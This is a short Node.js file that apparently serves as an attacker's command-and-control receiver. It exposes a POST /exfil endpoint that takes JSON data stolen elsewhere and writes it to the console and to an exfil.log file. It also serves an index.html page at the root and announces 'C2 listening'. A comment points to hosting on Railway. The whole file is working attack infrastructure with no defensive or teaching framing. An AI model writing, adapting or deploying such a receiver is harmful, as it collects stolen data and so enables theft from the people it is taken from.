const http = require('http');
const fs = require('fs');

const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/exfil') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const log = `[${new Date().toISOString()}] ${JSON.stringify(data, null, 2)}\n`;
        console.log(log);
        fs.appendFileSync('exfil.log', log);   // persistent on Railway volume if needed
        res.writeHead(200, {'Content-Type': 'text/plain'});
        res.end('OK');
      } catch (e) {
        res.writeHead(400);
        res.end('Bad');
      }
    });
  } else if (req.url === '/') {
    fs.readFile('index.html', (err, data) => {
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.end(data);
    });
  } else {
    res.writeHead(404);
    res.end('Not found');
  }
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`C2 listening on port ${PORT}`);
});
